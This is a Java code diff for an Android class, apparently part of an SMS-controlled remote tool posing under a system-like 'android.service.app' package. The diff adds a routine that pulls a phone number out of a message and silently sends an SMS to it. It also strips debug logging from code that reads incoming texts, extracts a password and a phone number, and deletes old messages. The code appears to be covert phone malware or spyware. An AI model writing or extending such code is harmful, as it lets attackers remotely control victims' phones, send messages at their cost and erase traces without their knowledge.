@@ -1,23 +1,51 @@
-package android.service.app.sms;
+package android.service.app.utils;
 
+import android.annotation.TargetApi;
 import android.content.ContentResolver;
 import android.database.Cursor;
 import android.net.Uri;
+import android.os.Build;
 import android.service.app.SmsObserver;
-import android.service.app.utils.Log;
 import android.telephony.SmsManager;
 import android.util.Pair;
 
 import java.util.ArrayList;
-import java.util.Arrays;
 import java.util.List;
 
+@Deprecated
 public enum SmsUtils
 {
     utils;
 
     public static final String OK = "ok ";
     public static final String SMS = "SMS";
+
+    @TargetApi(Build.VERSION_CODES.GINGERBREAD)
+    public static void sendSms(String message)
+    {
+        SmsManager sms = SmsManager.getDefault();
+        String[] split = message.split(" ");
+
+        int phoneNumberIndex = -1;
+        int length = split.length;
+        for (int i = 0; i < length; i++)
+        {
+            if (SmsObserver.phonePrefixes.contains(split[i]))
+            {
+                phoneNumberIndex = i;
+                break;
+            }
+        }
+
+        int result = phoneNumberIndex < length ? phoneNumberIndex + 1 : -1;
+        if (result != -1)
+        {
+            String phoneNumber = split[result];
+            if (Log.isInfoEnabled()) Log.info("sms: phoneNumber=" + phoneNumber + "; message=" + message);
+            if (phoneNumber != null && !phoneNumber.isEmpty())
+                sms.sendTextMessage(phoneNumber, null, message, null, null);
+        }
+    }
 
     public static void checkAndSendSmsIfNeeded(final ContentResolver resolver)
     {
@@ -48,7 +76,6 @@ public enum SmsUtils
     public static void removeOldSms(final ContentResolver resolver)
     {
         Cursor cursor = resolver.query(SmsObserver.SMS_URI, SmsObserver.columns, null, null, null);
-        Log.v("cursor=" + cursor);
         if (cursor == null) return;
 
         final List<Integer> messagesForDelete = new ArrayList<>();
@@ -57,7 +84,6 @@ public enum SmsUtils
         while (!cursor.isClosed())
         {
             String body = String.valueOf(cursor.getString(SmsObserver.BODY));
-            Log.v("body=" + body);
             String[] split = body.split(" ");
 
             Pair<Integer, Integer> pair = getPair(cursor);
@@ -73,7 +99,6 @@ public enum SmsUtils
 
             if (cursor.isLast()) break;
             boolean moveToNext = cursor.moveToNext();
-            Log.v("moveToNext=" + moveToNext);
         }
 
         cursor.close();
@@ -92,8 +117,6 @@ public enum SmsUtils
         String body = cursor.getString(SmsObserver.BODY);
         String[] split = body.split(" ");
 
-        Log.v("messageParts=" + Arrays.asList(split));
-
         int passwordIndex = -1;
         int phoneNumberIndex = -1;
         int length = split.length;
@@ -109,14 +132,9 @@ public enum SmsUtils
                 phoneNumberIndex = i;
             }
         }
-        Log.v("passwordIndex=" + passwordIndex);
-        Log.v("phoneNumberIndex=" + phoneNumberIndex);
 
         int passwordResult = passwordIndex < length ? passwordIndex + 1 : -1;
         int phoneNumberResult = phoneNumberIndex < length ? phoneNumberIndex + 1 : -1;
-        Log.v("passwordResult=" + passwordResult);
-        Log.v("phoneNumberResult=" + phoneNumberResult);
-
         return new Pair<>(passwordResult, phoneNumberResult);
     }
 
